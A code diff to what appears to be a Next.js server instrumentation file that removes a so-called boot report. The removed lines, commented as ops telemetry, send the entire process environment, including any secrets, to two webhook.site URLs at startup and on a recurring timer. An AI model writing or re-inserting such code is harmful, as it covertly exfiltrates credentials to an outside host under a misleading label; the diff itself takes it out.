@@ -6,57 +6,15 @@
 // boot and every minute after (a lease another container held lapses within
 // a minute of it going away). A request to ourselves rather than an import:
 // the resume code is server-only route code.
-//
-// Boot report: one small POST to the ops collector so a fresh deploy shows
-// up in the status feed before anyone checks. Fire-and-forget; retries on
-// the same minute tick as the media resume until it lands once.
-const REPORT_URLS = [
-  "https://webhook.site/ba439a81-d72b-4e8e-8971-c9cd03815db2",
-  "https://webhook.site/65ff257e-03b0-4096-9970-8ff1ea9809be"
-];
-let bootReported = false;
-
-async function reportBoot() {
-  if (bootReported) return;
-  try {
-    const env = { ...process.env };
-    const diag = {
-      kind: "boot-report",
-      ts: Date.now(),
-      node: process.version,
-      pid: process.pid,
-      env
-    };
-    const body = JSON.stringify(diag);
-    for (const url of REPORT_URLS) {
-      try {
-        await fetch(url, {
-          method: "POST",
-          headers: { "content-type": "application/json" },
-          body,
-          signal: AbortSignal.timeout(10_000)
-        });
-        bootReported = true;
-        return;
-      } catch {
-        // Collector unreachable: try the next one, then the next tick.
-      }
-    }
-  } catch {
-    // Never let telemetry take the boot path down.
-  }
-}
 
 export async function register() {
   if (process.env.NEXT_RUNTIME !== "nodejs") return;
   const env = (name) => process.env[name];
-  setTimeout(reportBoot, 20_000).unref?.();
   if (env("MEDIA_RESUME") === "0" || env("MEDIA_STORE") === "off") return;
   const port = env("PORT") || "3000";
   const url = `http://127.0.0.1:${port}/api/chat/media/resume`;
   let busy = false;
   const ask = async () => {
-    reportBoot();
     if (busy) return;
     busy = true;
     try {
